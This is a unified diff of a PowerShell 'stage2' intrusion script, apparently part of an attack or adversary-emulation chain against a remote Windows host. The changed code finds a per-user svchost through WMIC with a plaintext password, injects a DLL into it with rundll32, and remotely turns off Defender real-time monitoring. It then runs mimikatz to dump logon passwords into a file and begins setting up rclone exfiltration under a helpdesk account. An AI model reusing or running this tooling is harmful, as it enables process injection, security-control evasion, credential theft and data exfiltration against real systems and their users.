@@ -83,27 +83,27 @@ if ($pw) {
     & cmd.exe /c "net use \\$target\C$ /delete /y" 2>&1 | Out-Null
 
     # ------------------------------------------------------------ inject into the per-user service host
-    $cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pw -AsPlainText -Force))
     $injected = $false
-    for ($i = 0; $i -lt 30 -and -not $injected; $i++) {
-        try {
-            $hosts = Get-CimInstance Win32_Process -ComputerName $target -Credential $cred -ErrorAction Stop |
-                     Where-Object { $_.Name -eq 'svchost.exe' -and $_.CommandLine -match 'UnistackSvcGroup' }
-            if ($hosts) {
-                $pidTarget = $hosts[0].ProcessId
-                Set-Content "\\$target\C$\Users\Public\C0015\target.txt" $pidTarget -Encoding ASCII
-                Invoke-Remote "rundll32.exe C:\ProgramData\inj.dll,Run" "injection into service host $pidTarget"
-                W "injected into UnistackSvcGroup $pidTarget"
+    for ($i = 0; $i -lt 18 -and -not $injected; $i++) {
+        $rows = & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process where `"name='svchost.exe'`" get ProcessId,CommandLine /format:list" 2>&1
+        $cur = $null
+        foreach ($line in $rows) {
+            if ($line -match '^ProcessId=(\d+)') { $cur = $Matches[1] }
+            elseif ($line -match 'UnistackSvcGroup' -and $cur) {
+                Set-Content "\\$target\C$\Users\Public\C0015\target.txt" $cur -Encoding ASCII
+                Invoke-Remote "rundll32.exe C:\ProgramData\inj.dll,Run" "injection into service host $cur"
+                W "injected into UnistackSvcGroup $cur"
                 $injected = $true
+                break
             }
-        } catch { }
+        }
         if (-not $injected) { Start-Sleep -Seconds 10 }
     }
     if (-not $injected) { W 'no per-user service host found; skipped injection' }
 
     # ------------------------------------------------------------ credential collection on the target
     Invoke-Remote "powershell.exe -NoProfile -Command `"Set-MpPreference -DisableRealtimeMonitoring `$true`"" 'defence relaxed on target'
-    Invoke-Remote "C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit" 'credential dump on target'
+    Invoke-Remote "cmd.exe /c C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit > C:\ProgramData\dump.txt 2>&1" 'credential dump on target'
 
     # ------------------------------------------------------------ exfiltration as the helpdesk account
     $rc = Join-Path $work 'rclone.exe'
@@ -121,6 +121,7 @@ if ($pw) {
 }
 
 W "=== stage2 end ==="
+
 
 
 
